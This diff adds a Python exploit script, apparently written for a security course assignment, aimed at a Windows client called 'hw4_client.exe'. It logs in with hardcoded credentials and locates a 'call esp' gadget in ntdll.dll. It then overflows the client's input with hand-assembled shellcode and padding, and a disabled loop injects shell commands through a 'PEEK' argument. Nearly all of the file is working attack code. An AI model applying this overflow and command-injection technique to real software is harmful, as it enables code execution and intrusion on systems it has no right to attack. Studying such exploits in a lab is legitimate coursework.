@@ -1,0 +1,142 @@
+import socket
+import sys
+from sys import argv
+import subprocess
+from subprocess import PIPE
+from time import sleep
+import os
+import ctypes
+import struct
+from ctypes import wintypes, windll, POINTER, byref, sizeof, c_char
+from ctypes.wintypes import *
+
+
+class MODULEINFO(ctypes.Structure):
+    _fields_ = [
+        ("lpBaseOfDll",     wintypes.LPVOID),    # remote pointer
+        ("SizeOfImage",     wintypes.DWORD),
+        ("EntryPoint",      wintypes.LPVOID),    # remote pointer
+    ]
+
+
+LPMODULEINFO = POINTER(MODULEINFO)
+
+
+def GetModuleInformation(hProcess, hModule, lpmodinfo=None):
+    _GetModuleInformation = windll.psapi.GetModuleInformation
+    _GetModuleInformation.argtypes = [HANDLE, HMODULE, LPMODULEINFO, DWORD]
+    _GetModuleInformation.restype = bool
+
+    if lpmodinfo is None:
+        lpmodinfo = MODULEINFO()
+    _GetModuleInformation(hProcess, hModule, byref(
+        lpmodinfo), sizeof(lpmodinfo))
+    return lpmodinfo
+
+
+def GetCurrentProcess():
+    _GetCurrentProcess = windll.kernel32.GetCurrentProcess
+    _GetCurrentProcess.argtypes = []
+    _GetCurrentProcess.restype = wintypes.HANDLE
+    return _GetCurrentProcess()
+
+
+def GetMoudleHandle(module):
+    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+    kernel32.GetModuleHandleW.restype = wintypes.HMODULE
+    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
+    hMod = kernel32.GetModuleHandleW(module)
+
+    return hMod
+
+
+def GetGadgetAddress(gadget):
+    gadget_len = len(gadget)
+    curr_proc = GetCurrentProcess()
+    module_handle = GetMoudleHandle('ntdll.dll')
+    module_info = GetModuleInformation(curr_proc, module_handle)
+    module_size = module_info.SizeOfImage
+    moudle_bytes = (c_char * module_size).from_address(module_handle)
+    for i in range(module_size-gadget_len):
+        if (moudle_bytes[i:i+gadget_len] == gadget):
+            return module_handle + i
+
+
+#proc = subprocess.Popen('./hw4_client.exe', stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+proc = subprocess.Popen(["hw4_client.exe"], stdin=PIPE)
+print(proc.pid)
+input()
+
+username = "archer\n"
+usernameHex = str.encode(username)
+proc.stdin.write(usernameHex)
+proc.stdin.flush()
+password = "S43U0SE6NZ4S46S5\nPEEK"
+passwordHex = str.encode(password)
+proc.stdin.write(passwordHex)
+proc.stdin.flush()
+
+
+callEspHex = "FFD4" #call esp opcode
+callEspHexByteArray = bytearray.fromhex(callEspHex)
+callEspAdress = GetGadgetAddress(callEspHexByteArray)
+#print (callEspAdress)
+callEsp = str(hex(callEspAdress))[2:]
+address = ''
+address += callEsp[6] + callEsp[7] + callEsp[4] + callEsp[5] + callEsp[2] + callEsp[3] + callEsp[0] + callEsp[1]
+
+#print (address)
+
+shellcode = ""
+#jmptoshell = "E94ce8dd88"
+jmptoshell = "B868DFFFFF01C4FFE4"
+beginingOFShell = "89e5"														#mov    ebp,esp
+beginingOFShell += "81 ec a4 20 00 00"											#sub    esp,0x20a4
+beginingOFShell +=  "b8 63 61 40 00" 											#"mov    eax,0x406163==PEEK"
+beginingOFShell +=  "89 45 08 " 												#DWORD PTR [ebp+0x8],eax
+beginingOFShell +="8b 95 78 ec ff ff 89 54 24 04 C7 04 24 68 61 40 00 E8 8E 6e df ff"	# mov edx,DWORD PTR [ebp+0xc]
+																				# mov DWORD PTR [esp+0x4],edx
+																				# mov DWORD PTR [esp],0x406168
+																				# call scanf
+beginingOFShell +=  "83 c4 14 " 												#add    esp,14hex									
+beginingOFShell +=  "81 c5 b0 20 00 00 " 										#add    ebp,0x20b0									
+beginingOFShell +=	"C7 44 24 10 00 00 00 00 C7 44 24 0C 80 80 40 00"        	#mov 	dword ptr [esp+16], 0
+																				#mov    DWORD PTR [esp+0xc],0x408080
+beginingOFShell +=	"8D 85 6C DF FF FF 89 54 24 08 8B 45 F0"				 	# lea     eax, [ebp-2094h]
+																				#mov    DWORD PTR [esp+0x8],edx
+																				#mov    eax,DWORD PTR [ebp-0x10]
+beginingOFShell +=	"89 44 24 04 8B 45 08 89 04 24 e8 5b 3b df ff"				#mov    DWORD PTR [esp+0x4],eax
+																				#mov    eax,DWORD PTR [ebp+0x8]
+																				# mov    DWORD PTR [esp],eax
+																				#call    sub_401892
+beginingOFShell	+=	"83 c4 ec"												# esp ,-14hex
+beginingOFShell +=  "81 c5 50 df ff ff " 										#add    ebp,0x20b0									
+beginingOFShell +=	"89E883C008FFE0"											#mov    eax,ebp
+																				# add    eax,0x8	
+																				#jmp    eax	
+beginingOFShell	+= "00"* (8325 - 76)											#	nops
+
+
+shellcode += beginingOFShell + address + jmptoshell
+#print(shellcode)
+second_attack = bytearray.fromhex("0A") + bytearray.fromhex(shellcode)  + str.encode("\n")
+#proc.stdin.c(second_attack)
+proc.communicate(input=second_attack)
+
+
+while False:
+	try:
+		command = input()
+	except EOFError:
+		continue
+	if command == "exit":
+		proc.kill()
+		break
+	proc.stdin.write(str.encode("PEEK \" *;| out-null  " +command +"\n"))
+	proc.stdin.flush()
+
+#peek "*; echo msg"
+
+
+
+
